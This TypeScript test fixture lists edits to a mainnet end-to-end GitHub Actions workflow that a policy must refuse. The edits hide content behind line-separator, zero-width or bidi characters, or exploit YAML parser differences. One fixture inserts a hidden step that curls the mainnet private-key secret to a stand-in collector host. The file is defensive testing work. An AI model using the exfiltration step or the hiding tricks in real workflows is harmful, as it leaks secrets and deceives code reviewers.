/**
 * Mainnet E2E workflow edits that hide content behind characters the policy's
 * YAML parser and GitHub's runner split lines on differently, or that read
 * differently from what runs. Each must fail on the character allowlist;
 * the controls use only allowed characters and must still pass.
 */

/** A whole-file edit and the code point its failure must name. */
export type CharacterEdit = {
  readonly label: string;
  /** Text placed before the file. */
  readonly prefix: string;
  /** Text inserted before `anchor`, or "" for none. */
  readonly insert: string;
  readonly codePoint: string;
};

/** Anchor that hidden content is inserted before: the secrets step in `execute`. */
export const ANCHOR = "      - name: Check and mask mainnet secrets\n";

const SEPARATORS = [
  ["bare CR", "\r", "U+000D"],
  ["U+0085", "\u0085", "U+0085"],
  ["U+2028", " ", "U+2028"],
  ["U+2029", " ", "U+2029"],
] as const;

/** Each separator hiding a step, then hiding a directive; then other refused characters. */
export const CHARACTER_EDITS: readonly CharacterEdit[] = [
  ...SEPARATORS.flatMap(([name, character, codePoint]): CharacterEdit[] => [
    {
      label: `${name} hides an extra execute step in a comment`,
      prefix: "",
      insert: `      # reviewed${character}      - run: curl -d "$MAINNET_E2E_PRIVATE_KEY" https://collector.example\n`,
      codePoint,
    },
    {
      label: `${name} hides a %YAML 1.1 directive in a comment`,
      prefix: `# reviewed${character}%YAML 1.1\n---\n`,
      insert: "",
      codePoint,
    },
  ]),
  { label: "U+200B in a comment", prefix: "", insert: "      # x​y\n", codePoint: "U+200B" },
  { label: "U+202E in a comment", prefix: "", insert: "      # x‮y\n", codePoint: "U+202E" },
  { label: "tab in a comment", prefix: "", insert: "      #\treviewed\n", codePoint: "U+0009" },
  { label: "NBSP in a comment", prefix: "", insert: "      # x y\n", codePoint: "U+00A0" },
];

/** Spellings with only allowed characters, which must still pass. */
export const CHARACTER_CONTROLS: readonly Omit<CharacterEdit, "codePoint">[] = [
  { label: "leading BOM", prefix: "﻿", insert: "" },
  { label: "em dash in a comment", prefix: "", insert: "      # reviewed — no change\n" },
  {
    label: "% in a comment",
    prefix: "# 100% reviewed; %YAML is refused\n",
    insert: "      # %YAML 1.1 is not used\n",
  },
];

const GUARD_RUN = `        run: '[ "$GASLESS" = passed ] || { echo "::error::The gasless mainnet send did not pass."; exit 1; }'\n`;

// The guard as a double-quoted scalar with an escaped line break and then a
// blank line: `yaml` decodes the reviewed one-line guard, YamlDotNet keeps a
// newline after `{`, so GitHub would run a different script.
const escapedBreak = (blank: string): string =>
  `        run: "[ \\"$GASLESS\\" = passed ] || {\\\n${blank}\n          echo \\"::error::The gasless mainnet send did not pass.\\"; exit 1; }"\n`;

const replaced = (source: string, search: string, replacement: string): string => {
  if (!source.includes(search)) throw new Error(`missing: ${search}`);
  return source.replace(search, () => replacement);
};

/** A whole-workflow edit the pin must refuse, and the structural failure it raises, if any. */
export type PinEdit = {
  readonly label: string;
  readonly edit: (source: string) => string;
  /** The structural layer's failure, or "" when only the pin catches the edit. */
  readonly structural: string;
};

const PATH = ".github/workflows/mainnet-e2e.yml";
const ONE_LINE = `${PATH} must keep every plain or quoted scalar on one line`;

/** Parser differentials and plain edits that the exact-bytes pin refuses. */
export const PIN_EDITS: readonly PinEdit[] = [
  {
    label: "guard as double-quoted escaped break + empty line (LF)",
    edit: (source) => replaced(source, GUARD_RUN, escapedBreak("")),
    structural: ONE_LINE,
  },
  {
    label: "guard as double-quoted escaped break + empty line (CRLF file)",
    edit: (source) => replaced(source, GUARD_RUN, escapedBreak("")).replaceAll("\n", "\r\n"),
    structural: ONE_LINE,
  },
  {
    label: "guard as double-quoted escaped break + whitespace-only line",
    edit: (source) => replaced(source, GUARD_RUN, escapedBreak("   ")),
    structural: ONE_LINE,
  },
  {
    label: "final block scalar with no final LF",
    edit: (source) => source.replace(/\n$/, ""),
    structural: `${PATH} must end with a line feed`,
  },
  {
    label: "one-byte comment edit",
    edit: (source) => replaced(source, "# Live mainnet E2E", "# live mainnet E2E"),
    structural: "",
  },
];
